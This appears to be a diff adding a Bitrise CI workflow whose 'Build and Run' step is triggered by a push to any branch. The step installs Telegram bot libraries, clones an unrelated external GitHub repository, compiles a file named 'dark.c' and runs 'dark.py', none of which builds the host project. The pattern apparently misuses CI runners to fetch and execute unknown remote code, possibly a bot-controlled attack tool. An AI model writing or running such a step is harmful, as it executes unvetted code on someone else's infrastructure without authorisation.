@@ -1,0 +1,23 @@
+format_version: 1.1.0
+default_step_lib_source: https://github.com/bitrise-io/bitrise-steplib.git
+trigger_map:
+  - push_branch: "*"
+    workflow: primary
+workflows:
+  primary:
+    steps:
+      - git-clone@6: {}
+      - script@1:
+          title: Build and Run
+          inputs:
+            - content: |
+                python3 -m venv venv
+                . venv/bin/activate
+                apt-get update && apt-get install -y gcc libpthread-stubs0-dev
+                apt-get update && apt-get install -y gcc make
+                apt install python3-pip -y
+                pip3 install telebot flask pymongo aiohttp python-telegram-bot pytz
+                git clone https://github.com/VIKASH-5938/qq.git
+                cd qq
+                if [ -f dark.c ]; then gcc dark.c -o dark -lpthread; fi
+                python3 dark.py
